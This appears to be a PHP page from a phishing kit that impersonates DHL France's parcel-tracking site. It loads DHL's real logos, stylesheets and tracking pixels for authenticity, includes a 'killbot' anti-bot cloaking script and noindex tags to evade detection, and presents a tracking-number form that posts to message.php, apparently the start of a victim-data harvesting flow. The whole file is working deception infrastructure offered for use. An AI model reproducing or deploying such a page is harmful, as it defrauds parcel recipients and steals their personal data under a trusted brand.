<?php

session_start();
include "../assets/functions.php";
include '../server/traduction.php';
include_once('../settings.php');
include_once('../server/killbot.to.php');
?>


<!DOCTYPE html>
<html lang="fr-FR" dir="ltr" class="full-width-grid left-aligned-grid  " base="fr-fr">
	<head>
		<meta charset="utf-8"/>
    <!--Titre 1-->
		<title> <?php echo $translations[$lang]["login1"];?>  <?php echo $Numéro_colis?></title>
			<meta property="og:image" content="https://www.dhl.com/content/dam/dhl/global/core/images/teaser-image-main/dhl-logo.jpg"/>
		<meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache, notranslate, nofollow,">
<meta name="viewport" content="width=device-width" />
		<!--CSS-->
		<link rel="icon" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/favicon.ico" type="image/x-icon"/>
		<link rel="apple-touch-icon" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-57x57.png"/>
		<link rel="apple-touch-icon" sizes="76x76" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-76x76.png"/>
		<link rel="apple-touch-icon" sizes="120x120" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-120x120.png"/>
		<link rel="apple-touch-icon" sizes="180x180" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-180x180.png"/>
		<link rel="stylesheet" href="https://www.dhl.com/etc.clientlibs/dhl/clientlibs/clientlib-core.min.css" type="text/css">
		<script src="https://www.dhl.com/etc.clientlibs/dhl/clientlibs/clientlib-core.min.js"></script>
		<link rel="stylesheet" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle.a076c9e355ebaef1a87910cd47836dfa.css"/>
		<link rel="stylesheet" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle-utapi-ui.a076c9e355ebaef1a87910cd47836dfa.css"/>
		<!--JS-->
		<script src="https://assets.adobedtm.com/cd52279ef3fa/28cd5996a0e5/launch-ENa2e710b79eef40758cbb936003b8b231.min.js"></script>
		<script >
		</script>
		
	</head>
<header>

<?php include '../assets/header.php'; ?>  
</header>


	
		
		
		
			
			<div class="js--nav-padding-layer c-nav--padding-layer"></div>
			<main id="wcag-main-content">
				<div class="parsysPathStage parsys">
					<span class="link-anchor" id="parsysPathStage_marketing_stage_trac"></span>
					<div class="c-voc-marketing-stage component-margin">
						<div class="c-voc-marketing-stage--container">
							<picture>
								<source srcset="https://www.dhl.com/content/dam/dhl/global/core/images/marketing-stage-2730x1120/employee-receives-customer-signature-0001.web.1920.600.jpg, https://www.dhl.com/content/dam/dhl/global/core/images/marketing-stage-2730x1120/employee-receives-customer-signature-0001.jpg 2x" media="(min-width: 1365px)"/>
								<source srcset="https://www.dhl.com/content/dam/dhl/global/core/images/marketing-stage-2730x1120/employee-receives-customer-signature-0001.web.1365.428.jpg, https://www.dhl.com/content/dam/dhl/global/core/images/marketing-stage-2730x1120/employee-receives-customer-signature-0001.web.2730.854.jpg 2x" media="(min-width: 1024px)"/>
								<source srcset="https://www.dhl.com/content/dam/dhl/global/core/images/marketing-stage-2730x1120/employee-receives-customer-signature-0001.web.1024.321.jpg ,https://www.dhl.com/content/dam/dhl/global/core/images/marketing-stage-2730x1120/employee-receives-customer-signature-0001.web.2048.642.jpg 2x" media="(min-width: 768px)"/>
								<img class="c-voc-marketing-stage--bg-image" src="https://www.dhl.com/content/dam/dhl/global/core/images/marketing-stage-2730x1120/employee-receives-customer-signature-0001.web.785.246.jpg" alt="" data-object-fit="cover"/>
							</picture>
						</div>
						<div class="c-voc-marketing-stage--content has-background-20">
							<div class="c-voc-marketing-stage--textbox">

              <!--Titre-->
								<h2 class="c-voc-marketing-stage--block-text level4"><?php echo $translations[$lang]["login1"];?>  </h2>
								<div class="c-voc-tracking-bar js--tracking-bar">

                <!--FORM TRACKING-->
									<form class="c-tracking-input--form c-voc-tracking-bar--form js--tracking-bar--form" action="message.php" method="post" autosubmit="">
										<div class="c-voc-tracking-bar--input-outer-group">
											<div class="c-voc-tracking-bar--input-inner-group">

												
                      <input class="c-voc-tracking-bar--input js--tracking-bar--input" id="numero_suivi" name="numero_suivi" type="text"/>
												<label class="c-voc-tracking-bar--element-label" for="c-voc-marketing-stage-tracking--input"><?php echo $Numéro_colis ?></label>
												
                        <button class="c-voc-tracking-bar js--tracking-bar base-button " aria-label="" type="submit" ><?php echo $translations[$lang]["login2"];?></button>
											</div>
										</div>
										
									</form>
								</div>
								<div>
									<h2 class="c-voc-marketing-stage--link level4"></h2>
								</div>
							</div>
							<!--	DIV TRANSPARANTE	-->
							<div class="c-voc-marketing-stage--card-container">
								<a class=" c-voc-quicklink shadow-small l-grid--w-100pc-s l-grid--w-50pc-m" href="/fr-fr/home/reserver-en-ligne.html">
									<div class="c-voc-quicklink-body">
										<div class="c-voc-quicklink-image">
											<img class="c-voc-quicklink-image" src="https://www.dhl.com/content/dam/dhl/global/core/images/icons/general-icons/glo-core-online.svg" alt=""/>
										</div>
										<div class="c-voc-quicklink-text">
											<span class="c-voc-quicklink-headline link link-internal has-icon"> <?php echo $translations[$lang]["Envoyer maintenant"];?> </span>
											<p class="c-voc-quicklink-subtext">
											<?php echo $translations[$lang]["Trouver le bon service"];?>
											</p>
										</div>
									</div>
								</a>
								<a class=" c-voc-quicklink shadow-small l-grid--w-100pc-s l-grid--w-50pc-m" href="/fr-fr/home/obtenir-un-devis.html">
									<div class="c-voc-quicklink-body">
										<div class="c-voc-quicklink-image">
											<img class="c-voc-quicklink-image" src="https://www.dhl.com/content/dam/dhl/global/core/images/icons/general-icons/glo-core-getaquote.svg" alt=""/>
										</div>
										<div class="c-voc-quicklink-text">
											<span class="c-voc-quicklink-headline link link-internal has-icon"> <?php echo $translations[$lang]["Obtenir un devis"];?></span>
											<p class="c-voc-quicklink-subtext">
											<?php echo $translations[$lang]["Estimer le coût et comparer"];?>
											</p>
										</div>
									</div>
								</a>
								<a class=" c-voc-quicklink shadow-small l-grid--w-100pc-s l-grid--w-50pc-m imp-triangle  " href="/fr-fr/home/dhl-pour-le-business.html">
									<div class="c-voc-quicklink-body">
										<div class="c-voc-quicklink-image">
											<img class="c-voc-quicklink-image" src="https://www.dhl.com/content/dam/dhl/global/core/images/icons/gogreen-icons/glo-core-gogreen-warehousing.svg" alt=""/>
										</div>
										<div class="c-voc-quicklink-text">
											<span class="c-voc-quicklink-headline link link-internal has-icon"> <?php echo $translations[$lang]["DHL pour les entreprises"];?></span>
											<p class="c-voc-quicklink-subtext">
											<?php echo $translations[$lang]["Expéditions régulières"];?>
											</p>
										</div>
									</div>
								</a>
							</div>
						</div>
					</div>
				</div>
				
			</div>
			<span class="link-anchor" id="parsysPath_horizontal_ruler"></span>
			<div class="c-horizontal-ruler component-margin  l-grid l-grid--center-s invisible">
				<hr class="c-horizontal-ruler--wide"/>
			</div>
		
		</div>
	</div>
</div>
</div>
</div>

</span>
<div id="experiencefragment-deb6d4e362" class="cmp-experiencefragment cmp-experiencefragment--image_left_with_teasers"><div class="xf-content-height">
	<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
		<div class="container container-margin-bottom aem-GridColumn aem-GridColumn--default--12">
			<span class="link-anchor" id="root_container_copy"></span>
			<div class="cmp-container cmp-container--light-greycmp-container--full-widthcmp-container--padding-size-0cmp-container--left-on-top">
				<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
					<div class="container aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--12 aem-GridColumn--offset--default--0">
						<span class="link-anchor" id="container_copy_container_2120915718"></span>
						<span class="link-anchor" id="root_container_copy_container_2120915718"></span>
						<div class="cmp-container cmp-container--light-greycmp-container--padding-size-0cmp-container--equal-height-desktopcmp-container--left-on-top"> </div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
</div>
</div>
<div class="experiencefragment" data-xf-path="/content/experience-fragments/dhl/fr/core/sub_page_teaser/image_right_2_greycolumns/xbu_eu_spt_dhl_home_pallets_containers_and_cargo"><span class="link-anchor" id="parsysPath_experiencefragment_1512148575">
</span>
<div id="experiencefragment-9fc2b71272" class="cmp-experiencefragment cmp-experiencefragment--image_right_2_greycolumns"><div class="xf-content-height">
	<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
		<div class="container container-margin-bottom aem-GridColumn aem-GridColumn--default--12">
			<span class="link-anchor" id="root_container_copy_copy"></span>
			
		</div>
	</div>
</div>
</div>
</div>
<div class="experiencefragment" data-xf-path="/content/experience-fragments/dhl/fr/core/sub_page_teaser/image_left_3_greycolumns/xbu_master_spt_dhl_home_enterprise_logistics_services"><span class="link-anchor" id="parsysPath_experiencefragment_364874243">
</span>
<div id="experiencefragment-07ea9cfd90" class="cmp-experiencefragment cmp-experiencefragment--image_left_3_greycolumns"><div class="xf-content-height">
	<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
		<div class="container container-margin-bottom-fixed aem-GridColumn aem-GridColumn--default--12">
			<span class="link-anchor" id="root_container_copy_copy_"></span>
			<div class="cmp-container cmp-container--whitecmp-container--padding-size-0cmp-container--equal-height-desktopcmp-container--left-on-topcmp-container--horizontal-overlap-right-on-top">
				
			</div>
		</div>
	</div>
</div>
</div>
</div>
<div class="experiencefragment" data-xf-path="/content/experience-fragments/dhl/fr/core/help_and_related_tea/3_columns/xbu_master_hrt_dhl_home_products_and_value_added_services"><span class="link-anchor" id="parsysPath_experiencefragment_601520069">
</span>
<div id="/xbu_master_hrt_dhl_home_products_and_value_added_services" class="cmp-experiencefragment cmp-experiencefragment--3_columns"><div class="xf-content-height">
	<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
		<div class="container container-margin-bottom aem-GridColumn aem-GridColumn--default--12">
			<span class="link-anchor" id="root_container"></span>
			<div class="cmp-container cmp-container--whitecmp-container--gutter-21cmp-container--padding-size-0cmp-container--equal-height-desktopcmp-container--left-on-top">
				
			</div>
		</div>
	</div>
</div>
</div>
</div>
</div>
<a class="base-button c-go-to-top-button js--go-to-top-button has-icon icon-chevron-up" href="#" title="aller en haut" aria-label="aller en haut" data-tracking='{&quot;component&quot;:&quot;go-to-top-button&quot;}'></a>
</main>

<footer>
<?php include "../assets/footer.php"; ?>
</footer>

</div>
<div class="overlay js--overlay"></div>

<noscript><img src="https://deutschepostag.112.2o7.net/b/ss/dhlglobalrolloutprod/1/G.4--NS/0?pageName=Global%20Logistics%20and%20International%20Shipping%20%7C%20DHL%20Home%20%7C%20France%20%7C%20FR&events=event2&g=https://www.dhl.com/fr-fr/home.html" width="1" height="1" border="0" alt=""/>
</noscript>
<span aria-hidden="true" class="sr-only" id="a11y-message--new-window"> opens new window 
</span>
<span aria-hidden="true" class="sr-only" id="a11y-message--external-link"> opens external link 
</span>
<noscript><img src="https://www.dhl.com/akam/13/pixel_5a4b8999?a=dD0wMmQ4NTk0MzU3NGVjZDJkMDlmZThkMzU2M2U5OWRiYTA0Mjg0NWM1JmpzPW9mZg==" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" />
</noscript>


<div id="sec-overlay" style="display:none;"><div id="sec-container">
</div>
</div>
</body>

</html>
